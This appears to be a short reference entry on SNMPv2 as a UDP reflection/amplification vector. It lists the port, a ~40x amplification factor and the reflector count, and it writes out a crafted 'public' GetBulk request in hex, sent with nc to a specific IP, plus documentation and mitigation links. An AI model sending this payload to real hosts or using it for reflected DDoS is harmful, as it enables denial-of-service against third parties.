# SNMPv2

## Port: 161

## Proto: UDP

## Amplification factor: 40x

## Reflector count: ~295,000 with over 2,000 bytes.

---

### Refined "public" getbulk query

- **34 byte request responding with an average of 2300 bytes**, leading to an amplification factor of ~40x.

### Example request/response

- > ~# echo -ne '\x30\x24\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x17\x02\x04\x7b\x73\xcc\x13\x02\x01\x00\x02\x01\x64\x30\x09\x30\x07\x06\x03\x2b\x06\x01\x05\x00' |nc -u 31.133.49.250 161
      	<pre>2561 bytes</pre>

### Documentation

- https://tools.ietf.org/html/rfc3412
- https://kb.iweb.com/hc/en-us/articles/230268048-Guide-to-Public-SNMP-Amplification-Issues
- https://www.darkreading.com/attacks-breaches/snmp-ddos-attacks-spike/d/d-id/1269149

### Mitigations

- https://www.bitag.org/documents/SNMP-Reflected-Amplification-DDoS-Attack-Mitigation.pdf
